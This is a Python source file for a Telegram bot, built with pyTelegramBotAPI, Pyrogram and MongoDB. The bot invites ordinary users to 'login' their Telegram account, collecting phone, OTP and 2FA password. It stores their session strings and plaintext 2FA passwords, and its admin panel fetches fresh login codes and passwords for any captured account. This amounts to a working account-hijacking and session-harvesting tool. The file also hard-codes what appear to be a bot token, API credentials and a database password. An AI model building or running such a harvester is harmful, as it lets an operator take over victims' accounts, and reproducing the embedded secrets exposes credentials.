"""
Telegram OTP Bot - Admin + User Access
Admin: Full access
Users: Only login access
"""

import os
import logging
from datetime import datetime
from bson import ObjectId
from pymongo import MongoClient
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Import account manager
from account import AccountManager

# ========================
# CONFIGURATION
# ========================
BOT_TOKEN = os.getenv('BOT_TOKEN', '8519826315:AAHbIs3wdmNwfSoWN3LxAetdmNsqllUfJLs')
ADMIN_ID = int(os.getenv('ADMIN_ID', '7308740606'))

# Pyrogram API credentials
API_ID = int(os.getenv('API_ID', '6435225'))
API_HASH = os.getenv('API_HASH', '4e984ea35f854762dcde906dce426c2d')

# MongoDB
MONGO_URL = os.getenv('MONGO_URL', 'mongodb+srv://Alisha:Alisha123@cluster0.yqcpftw.mongodb.net/?retryWrites=true&w=majority')

# ========================
# SETUP
# ========================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Initialize database
try:
    mongo_client = MongoClient(MONGO_URL, serverSelectionTimeoutMS=5000)
    mongo_client.server_info()  # Test connection
    db = mongo_client.otp_bot
    accounts_col = db.accounts
    otp_logs_col = db.otp_logs
    users_col = db.users
    logger.info("✅ MongoDB connected successfully")
except Exception as e:
    logger.error(f"❌ MongoDB connection failed: {e}")
    raise

# Initialize account manager
account_manager = AccountManager(API_ID, API_HASH)

# Store temporary login states
login_states = {}  # {user_id: {step: "phone", phone: "", phone_code_hash: "", session_key: ""}}

# ========================
# UTILITY FUNCTIONS
# ========================
def is_admin(user_id):
    """Check if user is admin"""
    return str(user_id) == str(ADMIN_ID)

def ensure_user_exists(user_id, user_name=None, username=None):
    """Ensure user exists in database"""
    user = users_col.find_one({"user_id": user_id})
    if not user:
        user_data = {
            "user_id": user_id,
            "name": user_name or "Unknown",
            "username": username,
            "is_admin": is_admin(user_id),
            "created_at": datetime.utcnow(),
            "last_seen": datetime.utcnow()
        }
        users_col.insert_one(user_data)
        logger.info(f"New user registered: {user_id}")
    else:
        # Update last seen
        users_col.update_one(
            {"user_id": user_id},
            {"$set": {"last_seen": datetime.utcnow()}}
        )
    return user

def format_phone(phone):
    """Format phone number for display"""
    return phone if len(phone) <= 15 else f"{phone[:12]}..."

def get_total_accounts():
    """Get total number of accounts (admin only)"""
    return accounts_col.count_documents({}) if is_admin(ADMIN_ID) else 0

def get_all_accounts():
    """Get all accounts (admin only)"""
    if not is_admin(ADMIN_ID):
        return []
    return list(accounts_col.find({}, {"phone": 1, "_id": 1}).sort("created_at", -1))

def save_account(phone, session_string, has_2fa=False, two_step_password=None, added_by=None):
    """Save account to database"""
    try:
        # Check if account already exists
        existing = accounts_col.find_one({"phone": phone})
        if existing:
            accounts_col.update_one(
                {"phone": phone},
                {"$set": {
                    "session_string": session_string,
                    "has_2fa": has_2fa,
                    "two_step_password": two_step_password,
                    "updated_at": datetime.utcnow(),
                    "added_by": added_by
                }}
            )
            logger.info(f"Account updated: {phone}")
        else:
            account_data = {
                "phone": phone,
                "session_string": session_string,
                "has_2fa": has_2fa,
                "two_step_password": two_step_password,
                "created_at": datetime.utcnow(),
                "updated_at": datetime.utcnow(),
                "added_by": added_by,
                "status": "active"
            }
            accounts_col.insert_one(account_data)
            logger.info(f"Account saved: {phone}")
        return True
    except Exception as e:
        logger.error(f"Save account error: {e}")
        return False

def save_otp_log(phone, otp, fetched_by=None):
    """Save OTP fetch log"""
    try:
        log_data = {
            "phone": phone,
            "otp": otp,
            "fetched_by": fetched_by,
            "fetched_at": datetime.utcnow()
        }
        otp_logs_col.insert_one(log_data)
        logger.info(f"OTP logged for {phone}")
        return True
    except Exception as e:
        logger.error(f"Save OTP log error: {e}")
        return False

# ========================
# BOT HANDLERS - START
# ========================
@bot.message_handler(commands=['start'])
def handle_start(message):
    """Handle /start command for all users"""
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    username = message.from_user.username
    
    # Ensure user exists in database
    ensure_user_exists(user_id, user_name, username)
    
    # Clear any existing login state
    if user_id in login_states:
        del login_states[user_id]
    
    # Show appropriate menu based on user type
    if is_admin(user_id):
        show_admin_dashboard(user_id, message.chat.id)
    else:
        show_user_menu(user_id, message.chat.id)

def show_user_menu(user_id, chat_id=None):
    """Show menu for normal users"""
    if not chat_id:
        chat_id = user_id
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔐 Login Account", callback_data="user_login"))
    
    bot.send_message(
        chat_id,
        "👋 Welcome!\n\n"
        "You can login your Telegram account here.\n"
        "Click the button below to start:",
        reply_markup=markup
    )

def show_admin_dashboard(user_id, chat_id=None):
    """Show admin dashboard"""
    if not chat_id:
        chat_id = user_id
    
    if not is_admin(user_id):
        show_user_menu(user_id, chat_id)
        return
    
    total_accounts = get_total_accounts()
    total_users = users_col.count_documents({})
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("👁 View Accounts", callback_data="view_accounts"),
        InlineKeyboardButton("🔐 Add Account", callback_data="login_account")
    )
    markup.add(
        InlineKeyboardButton("👥 Users", callback_data="view_users"),
        InlineKeyboardButton("📊 Stats", callback_data="view_stats")
    )
    
    bot.send_message(
        chat_id,
        f"👑 **Admin Panel**\n\n"
        f"📊 Total Accounts: {total_accounts}\n"
        f"👥 Total Users: {total_users}\n\n"
        f"Select an option:",
        parse_mode="Markdown",
        reply_markup=markup
    )

# ========================
# USER LOGIN FLOW (For all users)
# ========================
@bot.callback_query_handler(func=lambda call: call.data == "user_login")
def handle_user_login(call):
    """Start login process for users"""
    user_id = call.from_user.id
    
    # Set state to ask for phone number
    login_states[user_id] = {"step": "ask_phone", "user_type": "normal"}
    
    bot.edit_message_text(
        "📱 **Login Your Account**\n\n"
        "Enter your phone number with country code:\n"
        "Example: +919876543210\n\n"
        "⚠️ Note: This will add your account to our system.",
        call.message.chat.id,
        call.message.message_id,
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup().add(
            InlineKeyboardButton("❌ Cancel", callback_data="user_cancel")
        )
    )

@bot.callback_query_handler(func=lambda call: call.data == "user_cancel")
def handle_user_cancel(call):
    """Cancel user login"""
    user_id = call.from_user.id
    
    if user_id in login_states:
        del login_states[user_id]
    
    if is_admin(user_id):
        show_admin_dashboard(user_id, call.message.chat.id)
    else:
        show_user_menu(user_id, call.message.chat.id)

@bot.callback_query_handler(func=lambda call: call.data == "login_account")
def handle_admin_login(call):
    """Start login process for admin"""
    user_id = call.from_user.id
    
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "🚫 Admin only feature", show_alert=True)
        return
    
    # Set state to ask for phone number
    login_states[user_id] = {"step": "ask_phone", "user_type": "admin"}
    
    bot.edit_message_text(
        "📱 **Add New Account**\n\n"
        "Enter phone number with country code:\n"
        "Example: +919876543210",
        call.message.chat.id,
        call.message.message_id,
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup().add(
            InlineKeyboardButton("❌ Cancel", callback_data="back_to_dashboard")
        )
    )

# ========================
# PHONE NUMBER HANDLER (For both users and admin)
# ========================
@bot.message_handler(func=lambda m: login_states.get(m.from_user.id, {}).get("step") == "ask_phone")
def handle_phone_input(message):
    """Handle phone number input from both users and admin"""
    user_id = message.from_user.id
    
    state = login_states.get(user_id)
    if not state:
        if is_admin(user_id):
            show_admin_dashboard(user_id, message.chat.id)
        else:
            show_user_menu(user_id, message.chat.id)
        return
    
    phone = message.text.strip()
    
    # Basic phone validation
    if not phone.startswith('+') or len(phone) < 10:
        if state.get("user_type") == "admin":
            markup = InlineKeyboardMarkup().add(
                InlineKeyboardButton("❌ Cancel", callback_data="back_to_dashboard")
            )
        else:
            markup = InlineKeyboardMarkup().add(
                InlineKeyboardButton("❌ Cancel", callback_data="user_cancel")
            )
        
        bot.send_message(
            user_id,
            "❌ Invalid phone format.\n\n"
            "Example: +919876543210\n\n"
            "Enter phone number again:",
            reply_markup=markup
        )
        return
    
    # Send OTP using Pyrogram
    bot.send_message(user_id, "⏳ Sending OTP...")
    
    try:
        result = account_manager.send_otp(phone)
        
        if not result.get("success"):
            error_msg = result.get("error", "Unknown error")
            
            if state.get("user_type") == "admin":
                markup = InlineKeyboardMarkup().add(
                    InlineKeyboardButton("❌ Cancel", callback_data="back_to_dashboard")
                )
            else:
                markup = InlineKeyboardMarkup().add(
                    InlineKeyboardButton("❌ Cancel", callback_data="user_cancel")
                )
            
            bot.send_message(
                user_id,
                f"❌ Failed to send OTP:\n{error_msg}\n\n"
                "Enter phone number again:",
                reply_markup=markup
            )
            return
        
        # Update state
        login_states[user_id] = {
            "step": "ask_otp",
            "phone": phone,
            "phone_code_hash": result["phone_code_hash"],
            "session_key": result["session_key"],
            "user_type": state.get("user_type", "normal")
        }
        
        if state.get("user_type") == "admin":
            markup = InlineKeyboardMarkup().add(
                InlineKeyboardButton("❌ Cancel", callback_data="back_to_dashboard")
            )
        else:
            markup = InlineKeyboardMarkup().add(
                InlineKeyboardButton("❌ Cancel", callback_data="user_cancel")
            )
        
        bot.send_message(
            user_id,
            f"✅ OTP sent to {phone}\n\n"
            "Enter the 5-digit OTP code:",
            reply_markup=markup
        )
        
    except Exception as e:
        logger.error(f"Send OTP error: {e}")
        bot.send_message(
            user_id,
            f"❌ Error sending OTP:\n{str(e)}\n\n"
            "Start again with /start"
        )
        if user_id in login_states:
            del login_states[user_id]

# ========================
# OTP HANDLER (For both users and admin)
# ========================
@bot.message_handler(func=lambda m: login_states.get(m.from_user.id, {}).get("step") == "ask_otp")
def handle_otp_input(message):
    """Handle OTP input from both users and admin"""
    user_id = message.from_user.id
    
    state = login_states.get(user_id)
    if not state:
        if is_admin(user_id):
            show_admin_dashboard(user_id, message.chat.id)
        else:
            show_user_menu(user_id, message.chat.id)
        return
    
    otp_code = message.text.strip()
    
    if not otp_code.isdigit() or len(otp_code) != 5:
        if state.get("user_type") == "admin":
            markup = InlineKeyboardMarkup().add(
                InlineKeyboardButton("❌ Cancel", callback_data="back_to_dashboard")
            )
        else:
            markup = InlineKeyboardMarkup().add(
                InlineKeyboardButton("❌ Cancel", callback_data="user_cancel")
            )
        
        bot.send_message(
            user_id,
            "❌ Invalid OTP format. Must be 5 digits.\n\n"
            "Enter OTP code again:",
            reply_markup=markup
        )
        return
    
    bot.send_message(user_id, "⏳ Verifying OTP...")
    
    try:
        result = account_manager.verify_otp(
            state["session_key"],
            otp_code,
            state["phone"],
            state["phone_code_hash"]
        )
        
        if result.get("needs_2fa"):
            # 2FA required
            login_states[user_id]["step"] = "ask_2fa"
            
            if state.get("user_type") == "admin":
                markup = InlineKeyboardMarkup().add(
                    InlineKeyboardButton("❌ Cancel", callback_data="back_to_dashboard")
                )
            else:
                markup = InlineKeyboardMarkup().add(
                    InlineKeyboardButton("❌ Cancel", callback_data="user_cancel")
                )
            
            bot.send_message(
                user_id,
                "🔐 2FA Password Required\n\n"
                "Enter your 2-step verification password:",
                reply_markup=markup
            )
            return
        
        if not result.get("success"):
            error_msg = result.get("error", "Unknown error")
            bot.send_message(
                user_id,
                f"❌ OTP verification failed:\n{error_msg}\n\n"
                "Start again with /start"
            )
            if user_id in login_states:
                del login_states[user_id]
            return
        
        # Save account to database
        user_type = state.get("user_type", "normal")
        added_by = user_id if user_type == "admin" else "user"
        
        saved = save_account(
            state["phone"],
            result["session_string"],
            result["has_2fa"],
            result.get("two_step_password"),
            added_by
        )
        
        if not saved:
            bot.send_message(
                user_id,
                "❌ Failed to save account to database.\n\n"
                "Start again with /start"
            )
        else:
            if user_type == "admin":
                bot.send_message(
                    user_id,
                    f"✅ Account added successfully!\n\n"
                    f"📱 Phone: {state['phone']}\n"
                    f"🔐 2FA: {'Enabled' if result['has_2fa'] else 'Disabled'}\n\n"
                    "Account is now available in admin panel."
                )
            else:
                bot.send_message(
                    user_id,
                    f"✅ Login successful!\n\n"
                    f"📱 Your account has been added.\n"
                    f"Phone: {state['phone']}\n"
                    f"🔐 2FA: {'Enabled' if result['has_2fa'] else 'Disabled'}\n\n"
                    "Thank you for using our service!"
                )
        
        # Clear state and show appropriate menu
        if user_id in login_states:
            del login_states[user_id]
        
        if user_type == "admin":
            show_admin_dashboard(user_id, message.chat.id)
        else:
            show_user_menu(user_id, message.chat.id)
        
    except Exception as e:
        logger.error(f"Verify OTP error: {e}")
        bot.send_message(
            user_id,
            f"❌ Error verifying OTP:\n{str(e)}\n\n"
            "Start again with /start"
        )
        if user_id in login_states:
            del login_states[user_id]

# ========================
# 2FA HANDLER (For both users and admin)
# ========================
@bot.message_handler(func=lambda m: login_states.get(m.from_user.id, {}).get("step") == "ask_2fa")
def handle_2fa_input(message):
    """Handle 2FA password input from both users and admin"""
    user_id = message.from_user.id
    
    state = login_states.get(user_id)
    if not state:
        if is_admin(user_id):
            show_admin_dashboard(user_id, message.chat.id)
        else:
            show_user_menu(user_id, message.chat.id)
        return
    
    password = message.text.strip()
    
    if not password:
        if state.get("user_type") == "admin":
            markup = InlineKeyboardMarkup().add(
                InlineKeyboardButton("❌ Cancel", callback_data="back_to_dashboard")
            )
        else:
            markup = InlineKeyboardMarkup().add(
                InlineKeyboardButton("❌ Cancel", callback_data="user_cancel")
            )
        
        bot.send_message(
            user_id,
            "❌ Password cannot be empty.\n\n"
            "Enter 2FA password again:",
            reply_markup=markup
        )
        return
    
    bot.send_message(user_id, "⏳ Verifying 2FA password...")
    
    try:
        result = account_manager.verify_2fa(state["session_key"], password)
        
        if not result.get("success"):
            error_msg = result.get("error", "Unknown error")
            bot.send_message(
                user_id,
                f"❌ 2FA verification failed:\n{error_msg}\n\n"
                "Start again with /start"
            )
            if user_id in login_states:
                del login_states[user_id]
            return
        
        # Save account to database
        user_type = state.get("user_type", "normal")
        added_by = user_id if user_type == "admin" else "user"
        
        saved = save_account(
            state["phone"],
            result["session_string"],
            result["has_2fa"],
            result.get("two_step_password"),
            added_by
        )
        
        if not saved:
            bot.send_message(
                user_id,
                "❌ Failed to save account to database.\n\n"
                "Start again with /start"
            )
        else:
            if user_type == "admin":
                bot.send_message(
                    user_id,
                    f"✅ Account added successfully!\n\n"
                    f"📱 Phone: {state['phone']}\n"
                    f"🔐 2FA: Enabled\n\n"
                    "Account is now available in admin panel."
                )
            else:
                bot.send_message(
                    user_id,
                    f"✅ Login successful!\n\n"
                    f"📱 Your account has been added.\n"
                    f"Phone: {state['phone']}\n"
                    f"🔐 2FA: Enabled\n\n"
                    "Thank you for using our service!"
                )
        
        # Clear state and show appropriate menu
        if user_id in login_states:
            del login_states[user_id]
        
        if user_type == "admin":
            show_admin_dashboard(user_id, message.chat.id)
        else:
            show_user_menu(user_id, message.chat.id)
        
    except Exception as e:
        logger.error(f"2FA verification error: {e}")
        bot.send_message(
            user_id,
            f"❌ Error verifying 2FA:\n{str(e)}\n\n"
            "Start again with /start"
        )
        if user_id in login_states:
            del login_states[user_id]

# ========================
# ADMIN ONLY FEATURES
# ========================
@bot.callback_query_handler(func=lambda call: call.data == "back_to_dashboard")
def handle_back_to_dashboard(call):
    """Go back to admin dashboard"""
    user_id = call.from_user.id
    
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "Admin only feature", show_alert=True)
        show_user_menu(user_id, call.message.chat.id)
        return
    
    # Clear login state
    if user_id in login_states:
        del login_states[user_id]
    
    show_admin_dashboard(user_id, call.message.chat.id)

@bot.callback_query_handler(func=lambda call: call.data == "view_accounts")
def handle_view_accounts(call):
    """Show all accounts (admin only)"""
    user_id = call.from_user.id
    
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "🚫 Admin only feature", show_alert=True)
        show_user_menu(user_id, call.message.chat.id)
        return
    
    # Fetch all accounts
    accounts = get_all_accounts()
    
    if not accounts:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔐 Add Account", callback_data="login_account"))
        markup.add(InlineKeyboardButton("⬅️ Back", callback_data="back_to_dashboard"))
        
        bot.edit_message_text(
            "📱 **No Accounts Found**\n\n"
            "Add your first account to get started.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="Markdown",
            reply_markup=markup
        )
        return
    
    # Create keyboard with account buttons
    markup = InlineKeyboardMarkup(row_width=1)
    
    for idx, account in enumerate(accounts, 1):
        phone_display = format_phone(account["phone"])
        markup.add(InlineKeyboardButton(
            f"{idx}️⃣ {phone_display}",
            callback_data=f"account_{account['_id']}"
        ))
    
    markup.add(InlineKeyboardButton("⬅️ Back to Dashboard", callback_data="back_to_dashboard"))
    
    bot.edit_message_text(
        f"📱 **Select Account**\n\n"
        f"Total: {len(accounts)} accounts",
        call.message.chat.id,
        call.message.message_id,
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("account_"))
def handle_account_selection(call):
    """Show actions for selected account (admin only)"""
    user_id = call.from_user.id
    
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "🚫 Admin only feature", show_alert=True)
        show_user_menu(user_id, call.message.chat.id)
        return
    
    account_id = call.data.replace("account_", "")
    
    try:
        account = accounts_col.find_one({"_id": ObjectId(account_id)})
        if not account:
            bot.answer_callback_query(call.id, "Account not found", show_alert=True)
            handle_view_accounts(call)
            return
        
        # Show account actions
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("🔢 Get Latest OTP", callback_data=f"get_otp_{account_id}"),
            InlineKeyboardButton("🚪 Logout Session", callback_data=f"logout_{account_id}")
        )
        markup.add(InlineKeyboardButton("⬅️ Back to Accounts", callback_data="view_accounts"))
        
        phone_display = format_phone(account["phone"])
        has_2fa = "✅ Enabled" if account.get("has_2fa") else "❌ Disabled"
        created = account.get("created_at", datetime.utcnow()).strftime("%d %b %Y")
        
        bot.edit_message_text(
            f"📱 **Account Details**\n\n"
            f"• Phone: `{phone_display}`\n"
            f"• 2FA: {has_2fa}\n"
            f"• Added: {created}\n\n"
            f"Select an action:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="Markdown",
            reply_markup=markup
        )
        
    except Exception as e:
        logger.error(f"Account selection error: {e}")
        bot.answer_callback_query(call.id, "Error loading account", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data.startswith("get_otp_"))
def handle_get_otp(call):
    """Fetch latest OTP for account (admin only)"""
    user_id = call.from_user.id
    
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "🚫 Admin only feature", show_alert=True)
        show_user_menu(user_id, call.message.chat.id)
        return
    
    account_id = call.data.replace("get_otp_", "")
    
    try:
        account = accounts_col.find_one({"_id": ObjectId(account_id)})
        if not account:
            bot.answer_callback_query(call.id, "Account not found", show_alert=True)
            handle_view_accounts(call)
            return
        
        bot.answer_callback_query(call.id, "⏳ Fetching OTP...")
        
        # Fetch OTP using Pyrogram
        otp = account_manager.get_latest_otp(
            account["session_string"],
            account["phone"]
        )
        
        if not otp:
            markup = InlineKeyboardMarkup(row_width=2)
            markup.add(
                InlineKeyboardButton("🔄 Try Again", callback_data=f"get_otp_{account_id}"),
                InlineKeyboardButton("⬅️ Back", callback_data=f"account_{account_id}")
            )
            
            bot.edit_message_text(
                f"📱 **No OTP Found**\n\n"
                f"Phone: `{format_phone(account['phone'])}`\n\n"
                f"No OTP found in recent messages.\n"
                f"Make sure Telegram is logged in and try again.",
                call.message.chat.id,
                call.message.message_id,
                parse_mode="Markdown",
                reply_markup=markup
            )
            return
        
        # Save OTP to logs
        save_otp_log(account["phone"], otp, user_id)
        
        # Prepare message
        message = f"📱 **OTP Details**\n\n"
        message += f"• Phone: `{format_phone(account['phone'])}`\n"
        message += f"• OTP: `{otp}`\n"
        
        if account.get("has_2fa") and account.get("two_step_password"):
            message += f"• 2FA Password: `{account['two_step_password']}`\n"
        
        message += f"• Fetched: {datetime.utcnow().strftime('%H:%M:%S')}\n"
        
        # Create buttons
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("🔄 Get OTP Again", callback_data=f"get_otp_{account_id}"),
            InlineKeyboardButton("🚪 Logout", callback_data=f"logout_{account_id}")
        )
        markup.add(InlineKeyboardButton("⬅️ Back to Account", callback_data=f"account_{account_id}"))
        
        bot.edit_message_text(
            message,
            call.message.chat.id,
            call.message.message_id,
            parse_mode="Markdown",
            reply_markup=markup
        )
        
    except Exception as e:
        logger.error(f"Get OTP error: {e}")
        bot.answer_callback_query(call.id, f"Error: {str(e)}", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data.startswith("logout_"))
def handle_logout(call):
    """Handle logout button (admin only)"""
    user_id = call.from_user.id
    
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "🚫 Admin only feature", show_alert=True)
        show_user_menu(user_id, call.message.chat.id)
        return
    
    account_id = call.data.replace("logout_", "")
    
    # Just go back to account details for now
    bot.answer_callback_query(call.id, "Logout feature coming soon!", show_alert=True)
    
    # Go back to account details
    call.data = f"account_{account_id}"
    handle_account_selection(call)

@bot.callback_query_handler(func=lambda call: call.data == "view_users")
def handle_view_users(call):
    """Show all users (admin only)"""
    user_id = call.from_user.id
    
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "🚫 Admin only feature", show_alert=True)
        return
    
    users = list(users_col.find({}, {"user_id": 1, "name": 1, "username": 1, "created_at": 1}).sort("created_at", -1).limit(50))
    
    if not users:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⬅️ Back", callback_data="back_to_dashboard"))
        
        bot.edit_message_text(
            "👥 **No Users Found**",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="Markdown",
            reply_markup=markup
        )
        return
    
    user_list = ""
    for idx, user in enumerate(users[:20], 1):
        username = f"@{user.get('username', 'N/A')}" if user.get("username") else "No username"
        user_list += f"{idx}. {user.get('name', 'Unknown')} ({username})\n"
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("⬅️ Back", callback_data="back_to_dashboard"))
    
    bot.edit_message_text(
        f"👥 **Users ({len(users)})**\n\n"
        f"{user_list}",
        call.message.chat.id,
        call.message.message_id,
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data == "view_stats")
def handle_view_stats(call):
    """Show stats (admin only)"""
    user_id = call.from_user.id
    
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "🚫 Admin only feature", show_alert=True)
        return
    
    total_accounts = accounts_col.count_documents({})
    total_users = users_col.count_documents({})
    total_otp_logs = otp_logs_col.count_documents({})
    
    # Recent OTPs
    recent_otps = list(otp_logs_col.find({}, {"phone": 1, "otp": 1, "fetched_at": 1}).sort("fetched_at", -1).limit(5))
    
    recent_text = ""
    for otp_log in recent_otps:
        phone = format_phone(otp_log.get("phone", "N/A"))
        otp = otp_log.get("otp", "N/A")
        time = otp_log.get("fetched_at", datetime.utcnow()).strftime("%H:%M")
        recent_text += f"• {phone}: {otp} ({time})\n"
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("⬅️ Back", callback_data="back_to_dashboard"))
    
    bot.edit_message_text(
        f"📊 **Statistics**\n\n"
        f"• Total Accounts: {total_accounts}\n"
        f"• Total Users: {total_users}\n"
        f"• Total OTP Fetches: {total_otp_logs}\n\n"
        f"**Recent OTPs:**\n{recent_text}",
        call.message.chat.id,
        call.message.message_id,
        parse_mode="Markdown",
        reply_markup=markup
    )

# ========================
# MESSAGE HANDLER
# ========================
@bot.message_handler(func=lambda m: True)
def handle_other_messages(message):
    """Handle all other messages"""
    user_id = message.from_user.id
    
    # Ensure user exists
    ensure_user_exists(user_id, message.from_user.first_name, message.from_user.username)
    
    # Show appropriate menu
    if is_admin(user_id):
        show_admin_dashboard(user_id, message.chat.id)
    else:
        show_user_menu(user_id, message.chat.id)

# ========================
# RUN BOT
# ========================
if __name__ == "__main__":
    logger.info("🤖 Starting OTP Bot...")
    logger.info(f"👑 Admin ID: {ADMIN_ID}")
    logger.info(f"📱 API ID: {API_ID}")
    
    # Create indexes
    try:
        accounts_col.create_index([("phone", 1)], unique=True)
        accounts_col.create_index([("created_at", -1)])
        accounts_col.create_index([("added_by", 1)])
        otp_logs_col.create_index([("fetched_at", -1)])
        users_col.create_index([("user_id", 1)], unique=True)
        users_col.create_index([("created_at", -1)])
        logger.info("✅ Database indexes created")
    except Exception as e:
        logger.error(f"❌ Index creation error: {e}")
    
    # Start bot
    logger.info("✅ Bot is running...")
    bot.infinity_polling()
